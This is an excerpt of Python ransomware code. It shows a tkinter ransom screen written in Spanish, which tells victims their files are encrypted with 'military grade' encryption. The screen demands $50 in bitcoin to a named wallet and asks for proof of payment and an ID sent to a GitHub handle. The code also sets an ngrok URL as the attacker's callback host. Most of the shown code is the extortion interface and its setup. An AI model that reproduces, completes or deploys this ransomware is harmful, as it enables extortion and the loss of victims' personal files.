...
url = 'http://55f2-200-116-7-52.ngrok-free.app' # PUT THE URL YOU GOT FROM NGROK HERE
...
def DECRYPT_FILE():
    ...
    label1 = tk.Label(root, text='TUS ARCHIVOS HAN SIDO ENCRIPTADOS POR H4ckPyUN ;)') # Title
    ...
    label1 = tk.Label(root, text='TUS DOCUMENTOS IMPORTANTES, FOTOS, VIDEOS HAN SIDO ENCRIPTADOS CON UN GRADO DE ENCRIPTACIÓN MILITAR Y LLAVE ÚNICA.') # Title
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*8, window=label1)


    label1 = tk.Label(root, text='Para desencriptar tus datos consigname 50$ en bitcoin a 0xf2A1Ef0daA6673d194240879cC5089A92E575F61, enviarme una prueba de la transferencia y tus DIGITS al github @H4ckPyUN') # Title
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*9, window=label1)

    label1 = tk.Label(root, text='TUS DIGITS ES {}'.format(digits))# Display digits
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    ...
    button1 = tk.Button(text='Desenciptar', command=DECRYPT_FILE)
